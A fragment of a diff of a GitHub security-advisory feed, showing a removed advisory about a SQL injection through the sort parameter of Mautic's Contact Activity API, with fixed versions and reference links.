-<p>This advisory addresses a SQL Injection vulnerability in the API endpoint used for retrieving contact activities. A vulnerability exists in the query construction for the Contact Activity timeline where the parameter responsible for determining the sort direction was not strictly validated against an allowlist, potentially allowing authenticated users to inject arbitrary SQL commands via the API.</p>
-<h3 id="mitigation">Mitigation</h3>
-<p>Please update to <strong>5.2.10</strong>, <strong>6.0.8</strong>, <strong>7.0.1</strong> or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<p>If there are any questions or comments about this advisory:</p>
-<p>Email Mautic at <a href="mailto:security@mautic.org">security@mautic.org</a></p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/mautic/mautic/security/advisories/GHSA-r5j5-q42h-fc93">https://github.com/mautic/mautic/security/advisories/GHSA-r5j5-q42h-fc93</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3105">https://nvd.nist.gov/vuln/detail/CVE-2026-3105</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/5.2.10">https://github.com/mautic/mautic/releases/tag/5.2.10</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/6.0.8">https://github.com/mautic/mautic/releases/tag/6.0.8</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/7.0.1">https://github.com/mautic/mautic/releases/tag/7.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5j5-q42h-fc93">https://github.com/advisories/GHSA-r5j5-q42h-fc93</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5j5-q42h-fc93</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-25T19:28:39.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[mautic/core] Mautic is Vulnerable to SQL Injection through Contact Activity API Sorting]]></title>
